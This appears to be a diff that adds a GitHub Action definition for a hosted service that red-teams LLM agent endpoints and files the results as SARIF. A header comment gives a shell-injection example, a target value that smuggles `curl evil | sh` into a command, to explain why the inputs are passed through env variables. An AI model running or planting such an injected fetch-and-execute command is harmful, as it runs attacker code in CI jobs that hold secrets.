@@ -1,0 +1,111 @@
+# The GitHub Action: one hosted scan per workflow run, the findings in the Security tab.
+#
+# It is a thin client over the hosted API and runs no binary — a trial account has no binary, and the
+# attack library does not leave with any artefact (CLAUDE.md, "one sealed package"). A customer who
+# HAS the package runs `sixi scan --format sarif --fail-on high --upload` in a plain `run:` step
+# instead; docs/ci-integration.md shows both.
+#
+# Inputs reach the script through `env:` and never through ${{ }} interpolation into a shell line:
+# a ${{ }} expansion is pasted into the script before bash parses it, and a target URL of
+# `x"; curl evil | sh; #` in a pull request title would run in the job that holds the API token.
+name: Sixi AI agent scan
+description: Red-teams an LLM agent endpoint from Sixi's hosted service and files the findings as SARIF.
+author: Sixi AI
+branding:
+  icon: shield
+  color: gray-dark
+
+inputs:
+  target:
+    description: The agent endpoint to test. A REST, MCP, A2A or WebSocket URL reachable from the internet.
+    required: true
+  api-token:
+    description: A Sixi pipeline token (Settings → Pipeline tokens). Pass it from a secret, never a literal.
+    required: true
+  api-url:
+    description: The Sixi API. The hosted service by default; a self-host names its own.
+    default: https://sixi.ch
+  transport:
+    description: rest | mcp | a2a | websocket
+    default: rest
+  name:
+    description: The label the dashboard files the scan under; the diff joins runs by it. Defaults to the target host.
+    default: ""
+  profile:
+    description: smoke | quick | deep | compliance | sharp. `smoke` is a wiring check and not evidence.
+    default: quick
+  fail-on:
+    description: Fail the job for a finding at or above this severity — critical | high | medium | low | none.
+    default: high
+  assurance:
+    description: >-
+      Compare this scan with the last one of the same target and fail the job for a weakness that is
+      NEW since then, even when its severity would pass fail-on. Needs a deployment whose licence
+      carries the platform claim; the job is refused with a clear message where it does not.
+    default: "false"
+  message-field:
+    description: REST only — the request field the message goes in.
+    default: message
+  reply-path:
+    description: REST only — the dotted path to the agent's reply in the response body.
+    default: response
+  target-bearer-token:
+    description: A bearer token the target needs, from a secret. Stored encrypted with the scan, masked in every API response.
+    default: ""
+  target-api-key-header:
+    description: An API-key header name the target needs (with target-api-key-value).
+    default: ""
+  target-api-key-value:
+    description: The API-key value, from a secret.
+    default: ""
+  timeout-minutes:
+    description: How long to wait for the scan before the job gives up. The scan keeps running in the dashboard.
+    default: "90"
+  sarif-path:
+    description: Where to write the SARIF for github/codeql-action/upload-sarif.
+    default: sixi.sarif
+
+outputs:
+  scan-id:
+    description: The scan the dashboard filed.
+    value: ${{ steps.scan.outputs.scan-id }}
+  report-url:
+    description: The full report, with the evidence the SARIF deliberately omits.
+    value: ${{ steps.scan.outputs.report-url }}
+  findings:
+    description: How many findings the scan recorded.
+    value: ${{ steps.scan.outputs.findings }}
+  risk-rating:
+    description: The scan's overall rating.
+    value: ${{ steps.scan.outputs.risk-rating }}
+  sarif-path:
+    description: The SARIF written, for the upload step.
+    value: ${{ steps.scan.outputs.sarif-path }}
+  drift-new:
+    description: >-
+      Weaknesses that are new since the baseline, when assurance is on. Absent otherwise — an absent
+      value is "not measured", never a measured zero.
+    value: ${{ steps.scan.outputs.drift-new }}
+
+runs:
+  using: composite
+  steps:
+    - id: scan
+      shell: bash
+      env:
+        SIXI_TARGET: ${{ inputs.target }}
+        SIXI_API_TOKEN: ${{ inputs.api-token }}
+        SIXI_API_URL: ${{ inputs.api-url }}
+        SIXI_TRANSPORT: ${{ inputs.transport }}
+        SIXI_NAME: ${{ inputs.name }}
+        SIXI_PROFILE: ${{ inputs.profile }}
+        SIXI_FAIL_ON: ${{ inputs.fail-on }}
+        SIXI_ASSURANCE: ${{ inputs.assurance }}
+        SIXI_MESSAGE_FIELD: ${{ inputs.message-field }}
+        SIXI_REPLY_PATH: ${{ inputs.reply-path }}
+        SIXI_TARGET_BEARER_TOKEN: ${{ inputs.target-bearer-token }}
+        SIXI_TARGET_API_KEY_HEADER: ${{ inputs.target-api-key-header }}
+        SIXI_TARGET_API_KEY_VALUE: ${{ inputs.target-api-key-value }}
+        SIXI_TIMEOUT_MINUTES: ${{ inputs.timeout-minutes }}
+        SIXI_SARIF_PATH: ${{ inputs.sarif-path }}
+      run: bash "$GITHUB_ACTION_PATH/action/scan.sh"
